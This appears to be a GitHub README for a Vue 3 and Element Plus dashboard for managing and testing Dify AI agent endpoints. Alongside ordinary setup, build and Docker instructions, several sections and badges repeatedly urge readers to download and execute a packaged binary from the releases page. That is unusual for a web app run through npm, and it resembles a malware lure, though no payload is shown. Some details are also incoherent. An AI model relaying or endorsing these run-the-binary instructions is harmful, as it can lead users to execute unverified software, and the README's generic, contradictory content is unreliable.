# Dify Sample: Vue 3 AI Agent Platform with Element Plus UI

[![Releases](https://img.shields.io/badge/Release-Download-blue?logo=github)](https://github.com/damienwww/dify-application-sample/releases)

![Hero Image](https://raw.githubusercontent.com/vuejs/art/main/logo.png)  
![Element Plus](https://element-plus.org/images/element-plus-logo-small.svg)

A clean, responsive AI agent dashboard built with Vue 3 and Element Plus. It provides a modern UI to manage Dify URLs, test agents, and preview agent flows. The project focuses on clarity, fast iteration, and a smooth developer experience.

Table of contents
- Features
- Screenshots
- Quick start
- Releases (download & run)
- Project structure
- Core components
- Configuration
- Development tips
- Deployment
- Contributing
- License

Features
- Responsive layout with Vue 3 composition API and Element Plus components.
- Centralized URL manager for Dify endpoints.
- Agent preview panel with request/response inspector.
- Built-in test runner for endpoint checks.
- Role-based UI controls for admin and viewer modes.
- Lightweight state management using Pinia.
- Clear routing and lazy loading for large deployments.

Screenshots
- Dashboard overview  
  ![Dashboard](https://user-images.githubusercontent.com/1592092/133885546-65aefe3d-ff25-4e81-9d2d-6bd7b6fd1b9b.png)
- Agent editor and flow preview  
  ![Agent Editor](https://user-images.githubusercontent.com/1592092/133885559-8ffb8d8a-2e06-4b9a-a4b2-3f3f2f0c4c8b.png)
- URL manager and test results  
  ![URL Manager](https://user-images.githubusercontent.com/1592092/133885579-4c8c3a86-e5b1-4b24-9d56-9b8e6d8a3d86.png)

Quick start

Prerequisites
- Node.js 16+ or 18+
- npm or yarn
- Git

Clone the repo
```bash
git clone https://github.com/damienwww/dify-application-sample.git
cd dify-application-sample
```

Install
```bash
npm install
# or
yarn
```

Run locally
```bash
npm run dev
# or
yarn dev
```

Open http://localhost:5173 in your browser. The app starts with demo data. Edit the config to point to your Dify endpoints.

Releases — download and execute
- You must download the release artifact from the Releases page and execute it to run the packaged app. Visit the Releases page and download the correct file for your platform: https://github.com/damienwww/dify-application-sample/releases  
- Use the same link to find packaged installers or binaries. Each release includes a README for the artifact and a small run script inside the archive.

[![Download Release](https://img.shields.io/badge/Get%20Release-Download%20Now-brightgreen?logo=github)](https://github.com/damienwww/dify-application-sample/releases)

Project structure
- src/
  - main.ts — app entry
  - App.vue — root component
  - router/ — Vue Router setup
  - store/ — Pinia stores
  - views/
    - Dashboard.vue
    - Agents.vue
    - UrlManager.vue
    - Settings.vue
  - components/
    - AgentCard.vue
    - UrlTable.vue
    - RequestInspector.vue
    - FlowPreview.vue
  - services/
    - api.ts — wrapper for fetch / axios
    - dify.ts — Dify specific helpers
  - assets/ — logos, icons, images
- public/ — static files
- scripts/ — build and helper scripts
- electron/ (optional) — desktop build scripts

Core components and concepts
- UrlManager
  - List saved Dify endpoints.
  - Test a URL with a single click.
  - Store headers and auth per entry.
- AgentCard
  - Show agent summary and quick actions.
  - Launch live preview or edit agent settings.
- FlowPreview
  - Render agent flow as nodes and edges.
  - Run simulated inputs and inspect outputs.
- RequestInspector
  - Capture HTTP requests and responses.
  - Show request headers, body, and response timing.

State and data
- Use Pinia for a small, typed store per domain:
  - useUrlStore — manage saved URLs and test results.
  - useAgentStore — manage agent metadata and local cache.
  - useUiStore — theme, layout, and permissions.
- Persist URL store to localStorage for quick setup.

Configuration
- config/default.ts
  - baseApi: default API proxy
  - demoMode: true | false
  - theme: light | dark
- .env
  - VITE_BASE_URL — default server proxy
  - VITE_ENABLE_ANALYTICS — optional

Sample config
```js
export default {
  baseApi: "https://api.example.com",
  demoMode: true,
  theme: "light"
}
```

Authentication
- The app supports API keys and bearer tokens per URL entry.
- Store secrets in the browser only when demoMode=false is off. For production, use a secure backend proxy.

Building and packaging
- Build web app
```bash
npm run build
# or
yarn build
```
- Serve built files with any static server
```bash
npx serve dist
```
- Desktop packaging
  - The repo includes optional electron scripts under electron/.
  - Use the Releases page to download prebuilt installers. The release archive includes an executable or installer you should run on your platform.

Testing
- Unit tests use Vitest.
```bash
npm run test
# or
yarn test
```
- End-to-end tests use Playwright. Tests cover flows for URL checks and agent preview.

Development tips
- Use the Vue Devtools to inspect Pinia state and routing.
- Use the RequestInspector to debug API errors and timeouts.
- Keep demoMode on for safe local tests.
- Use the built-in test runner to validate endpoints before saving them.

Deploy
- Static hosting: Netlify, Vercel, or GitHub Pages.
- Docker
  - Use a simple Nginx image that serves the dist folder.
  - Example Dockerfile
```dockerfile
FROM nginx:stable-alpine
COPY dist /usr/share/nginx/html
EXPOSE 80
```
- CI
  - Build via GitHub Actions and push release artifacts to the Releases page.
  - Each release can include binaries for Windows, macOS, and Linux.

Integrations
- Dify endpoints
  - The UI expects standard JSON responses from Dify API endpoints.
  - Add custom headers per URL entry for auth and tracing.
- Webhooks
  - The app can send test payloads to webhook endpoints and show response history.

Security
- Keep API keys out of git.
- Use environment variables and a backend proxy for secret management in production.
- The app uses CORS-safe requests. For local testing, run a proxy if the endpoint blocks cross-origin requests.

Contributing
- Fork the repo and open a pull request.
- Keep PRs small and focused.
- Follow the code style in the repo: ESLint and Prettier are set up.
- Use feature branches named feature/<short-descriptor>.

Common workflows
- Add a new Dify endpoint
  1. Open Url Manager.
  2. Click Add.
  3. Provide URL, auth type, and tags.
  4. Click Test to validate the endpoint.
  5. Save.
- Create an agent preview
  1. Open Agents.
  2. Select New Agent.
  3. Fill name, description, and point it to a URL entry.
  4. Use Flow Preview to simulate input.

Troubleshooting
- If the UI cannot reach an endpoint, use RequestInspector to confirm CORS or auth errors.
- For missing images or static assets, check the public/ folder and build output.
- If the packaged app fails to start after download, ensure you downloaded the correct artifact from the Releases page and follow the included run instructions.

Releases and downloads
- Download and execute the release artifact from the Releases page. The release archive contains the executable or installer and a small run script. Visit: https://github.com/damienwww/dify-application-sample/releases
- The Releases page lists all packaged builds, checksums, and change logs.

FAQ
- Q: Does the app store my keys on the server?  
  A: No. The default build stores keys only in your browser storage. For shared deployments, use a secure backend proxy.
- Q: Can I run the app offline?  
  A: The UI runs offline for demo data. Agent calls require network access.
- Q: Which browsers work?  
  A: Modern Chromium-based browsers, Firefox, and Safari. Mobile support works but UI aims desktop first.

Changelog
- See the Releases page for full changelog and downloads: https://github.com/damienwww/dify-application-sample/releases

Acknowledgements
- Built with Vue 3 and Element Plus.
- Icons and images use public assets and the Vue brand resources.

License
- MIT

Contact
- Open issues on GitHub for bugs or feature requests.